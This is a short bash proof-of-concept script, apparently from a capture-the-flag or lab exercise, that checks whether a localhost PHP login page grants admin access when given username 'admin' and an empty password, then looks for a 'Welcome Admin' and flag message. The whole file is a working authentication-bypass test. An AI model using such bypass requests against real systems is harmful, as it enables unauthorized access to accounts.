#!/bin/bash

# POC: Authentication Bypass - Empty Password Acceptance for Admin Account
# This script demonstrates the vulnerability where the admin account can be 
# accessed by providing username 'admin' with an empty password parameter.

TARGET_URL="http://localhost:3000/index.php"

echo "[*] Testing Authentication Bypass: Empty Password for Admin Account"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Attempt login with admin username and empty password
echo "[TEST 1] Attempting login with username=admin and empty password..."
response=$(curl -s "$TARGET_URL?username=admin&password=")
echo "[+] Response received"
echo ""

# Check if the response contains the success indicators
if echo "$response" | grep -q "Welcome Admin"; then
    echo "[✓] SUCCESS: Authentication bypass confirmed!"
    echo "[✓] Response contains 'Welcome Admin' - Admin access granted with empty password"
    echo ""
    
    if echo "$response" | grep -q "Congratulations"; then
        echo "[✓] Flag revelation confirmed in response"
        echo ""
    fi
    
    # Extract and display relevant parts of response
    echo "[*] Response excerpt:"
    echo "$response" | grep -A 2 "Welcome Admin" | head -5
    echo ""
    
    exit 0
else
    echo "[-] Authentication bypass failed - 'Welcome Admin' not found in response"
    echo "[-] Response: $response"
    exit 1
fi